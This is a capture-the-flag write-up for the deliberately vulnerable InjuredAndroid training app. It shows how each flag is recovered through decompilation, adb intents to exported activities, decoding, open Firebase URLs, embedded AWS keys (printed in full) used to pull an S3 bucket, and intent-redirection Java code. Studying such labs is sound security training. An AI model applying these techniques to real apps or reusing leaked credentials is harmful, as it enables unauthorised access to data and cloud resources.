# Injured Android Write-up

## Setup

`git clone https://github.com/B3nac/InjuredAndroid`

## Flag One - Login

Using a decompiler of your choice, go ahead and see the Java code of `b3nac.injuredandroid.FlagOneLoginActivity`:

```java
public void submitFlag(View view) {
    if (((EditText) findViewById(R.id.editText2)).getText().toString().equals("F1ag_0n3")) {
        Intent intent = new Intent(this, FlagOneSuccess.class);
        FlagsOverview.flagOneButtonColor = true;
        startActivity(intent);
    }
}
```

The submit flag function is called when the submit button in the `content_flag_one_login.xml` is clicked:

```xml
<Button android:id="@+id/button5" android:onClick="submitFlag">
```

The condition to start the FlagOneSuccess intent is for the editText2's text to be `F1ag_0n3`.

## Flag Two - Exported Activity

The following activity is exported (looking into the manifest):

```xml
<activity android:name="b3nac.injuredandroid.b25lActivity" android:exported="true"/>
```

When we look at the Java code, it becomes clear that this is the activity that we need to invoke.

```java

public class b25lActivity extends AppCompatActivity {
    /* access modifiers changed from: protected */
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView((int) R.layout.activity_b25l);
        FlagsOverview.flagTwoButtonColor = true;
    }
}
```

We can invoke this activity using `am` as follows:

```
adb shell am start -n b3nac.injuredandroid/.b25lActivity
```

When we do so, we get the flag `S3c0nd_F1ag`.

## Flag Three - Resources

Similar to the first flag, but this time string isn't embedded in the smali file, rather we have to find it in resources.

```java
if (((EditText) findViewById(R.id.editText2)).getText().toString().equals(getString(R.string.cmVzb3VyY2VzX3lv)))
```

Go into `resources.asrc > res > values > strings.xml`:

```xml
<string name="cmVzb3VyY2VzX3lv">F1ag_thr33</string>
```

We can then get the points by inserting the flag `F1ag_thr33` into the edit text given in the activity.

## Flag Four - Login 2

This time, we need to look into what `Decoder.getData()` returns:

```java
if (((EditText) findViewById(R.id.editText2)).getText().toString().equals(new String(new Decoder().getData())))
```

We need to base64 decode the given string:

```java
public class Decoder {
    byte[] data = Base64.decode("NF9vdmVyZG9uZV9vbWVsZXRz", 0);

    public byte[] getData() {
        return this.data;
    }
}
```

We get the flag as `4_overdone_omelets`.

## Flag Five - Exported Broadcast Receiver

The `b3nac.injuredandroid.FlagFiveActivity` calls the `b3nac.injuredandroid.FlagFiveReceiver`.

Once the receiver is called twice, we get the flag.

```java
// -snip-

} else if (i == 2) {
    FlagsOverview.flagFiveButtonColor = true;
    Toast.makeText(context, "You are a winner " + VGV4dEVuY3J5cHRpb25Ud28.decrypt("Zkdlt0WwtLQ="), 1).show();
}

// -snip-
```

If you open the activity three times you get the message `You are a winner {F1v3!}` and the flag is auto submitted to the scoring system.

## Flag Six - Login 3

```java
public void submitFlag(View view) {
    String post = ((EditText) findViewById(R.id.editText3)).getText().toString();
    VGV4dEVuY3J5cHRpb25Ud28.encrypt("{This_Isn't_Where_I_Parked_My_Car}");
    VGV4dEVuY3J5cHRpb25Ud28.decrypt("k3FElEG9lnoWbOateGhj5pX6QsXRNJKh///8Jxi8KXW7iDpk2xRxhQ==");
    if (post.equals(VGV4dEVuY3J5cHRpb25Ud28.decrypt("k3FElEG9lnoWbOateGhj5pX6QsXRNJKh///8Jxi8KXW7iDpk2xRxhQ=="))) {
        Intent intent = new Intent(this, FlagOneSuccess.class);
        FlagsOverview.flagSixButtonColor = true;
        startActivity(intent);
    }
}
```

We need to reverse a custom decrypt method implemented in the `VGV4dEVuY3J5cHRpb25Ud28` class. But since we already have a pretty good decompiled version of the Java code, we can copy and paste the code to an external file and run the Java code after doing some necessary fixes. I have uploaded my code [here](injured_android/VGV4dEVuY3J5cHRpb25Ud28.java).

```bash
$ javac VGV4dEVuY3J5cHRpb25Ud28.java 
$ java VGV4dEVuY3J5cHRpb25Ud28 
Decrypted: k3FElEG9lnoWbOateGhj5pX6QsXRNJKh///8Jxi8KXW7iDpk2xRxhQ== -> {This_Isn't_Where_I_Parked_My_Car}
```

## Flag Seven - SQLite

Within the activity, the following string is being base64 decoded `MmFiOTYzOTBjN2RiZTM0MzlkZTc0ZDBjOWIwYjE3Njc=` to `2ab96390c7dbe3439de74d0c9b0b1767`. We can get the md5 hash of this value from the internet: `hunter2`.

There was reference to a remote url as well, but it seemed to be rotated. I solved it using python.

```python
>> cipher = "9EEADi^^:?;FC652?5C@:5]7:C632D6:@]4@>^DB=:E6];D@?"
>> print ''.join([chr(ord(x) + 47) for x in cipher])
https���injuredandroid�firebaseio�com�sqlite�json
```

The text is partly messed up after the rotation, I simply guess the actual URL and get the flag.

![](flag_seven.png)

Then we need to go back to the activity and enter the flag as `S3V3N_11` and the password as `hunter2`.

## Flag Eight - AWS

For this flag, we need to download and install aws-cli.

Then we configure the CLI using keys found in `strings.xml`:

```bash
$ aws configure
AWS Access Key ID [None]: AKIAZ36DGKTUIOLDOBN6
AWS Secret Access Key [None]: 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
Default region name [None]: 
Default output format [None]: 
```

Then we `ls` into the bucket and download the flag file:

```
$ aws s3 ls
2020-01-11 07:07:02 injuredandroid

$ aws s3 ls injuredandroid
2020-01-11 07:17:15         19 C10ud_S3cur1ty_lol

$ aws s3 cp s3://injuredandroid . --recursive
download: s3://injuredandroid/C10ud_S3cur1ty_lol to ./C10ud_S3cur1ty_lol

$ cat C10ud_S3cur1ty_lol 
C10ud_S3cur1ty_lol
```

## Flag Nine - Firebase

`FlagNineFirebaseActivity` is using firebase directory `/flags`. In decompilation where `ZmxhZ3Mv` is the base64 encoded form of `flags`.

```java
byte[] decodedDirectory = Base64.decode("ZmxhZ3Mv", 0);
final String refDirectory = new String(this.decodedDirectory, StandardCharsets.UTF_8);
```

Thus, using the same technique as before, I head over to:

```
https://injuredandroid.firebaseio.com/flags/.json
```

Where I get the string `[nine!_flag]`. In the activity for this flag, there is a check against the base64 decoded value of an edit text that we control. Therefore I encoded the string I got through the url and submitted the following value to get the flag `W25pbmUhX2ZsYWdd`.

## Flag Ten - Unicode



## Flag Eleven - Deep Links

```xml
<activity android:label="@string/title_activity_deep_link" android:name="b3nac.injuredandroid.DeepLinkActivity">
    <intent-filter android:label="filter_view_flag11">
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="flag11"/>
    </intent-filter>
    <intent-filter android:label="filter_view_flag11"
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="https"/>
    </intent-filter>
</activity>
```

First open the activity using the following code

```bash
$ adb shell am start -n b3nac.injuredandroid/.DeepLinkActivity -a android.intent.action.VIEW -d "flag11://"
```

In this `https://injuredandroid.firebaseio.com/binary/.json` URL we find a string `HIIMASTRING` which we can then enter in the given textbox to score this flag.

## Flag Twelve - Protected Components

For this challenge we need to use an exported activity. The FlagTwelveProtected itself isn't exported therefore we can't call it through an intent. In the manifest, if we look careful (or search for `exported="true"`) we come across the following:

```xml
<activity android:theme="@style/AppTheme.NoActionBar" android:label="@string/title_activity_exported_protected_intent" android:name="b3nac.injuredandroid.ExportedProtectedIntent" android:exported="true"/>
```

The Java code of the following activity, can be used to pivot to the protected activity.

```java
public void onResume() {
    super.onResume();
    handleIntentExtras(getIntent());
}

private void handleIntentExtras(Intent intent) {
    Intent unprotectedIntent = (Intent) intent.getParcelableExtra("access_protected_component");
    if (unprotectedIntent != null) {
        startActivity(unprotectedIntent);
    }
}
```

We observe that when `onResume` is called, the intent passed into `ExportedProtectedIntent` is used again to start a new activity. If we pass an extra into the intent by the name of `access_protected_component`, we can invoke the `FlagTwelveProtected` activity.

Here is some sample code I used to achieve the desired effect, the flag is auto submitted.

```java
public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Intent two = new Intent();
        two.setComponent(new ComponentName("b3nac.injuredandroid", "b3nac.injuredandroid.FlagTwelveProtectedActivity"));
        two.putExtra("totally_secure", "doesn't matter");

        Intent one = new Intent();
        one.setComponent(new ComponentName("b3nac.injuredandroid", "b3nac.injuredandroid.ExportedProtectedIntent"));
        one.putExtra("access_protected_component", two);

        startActivity(one);
    }
}
```

----

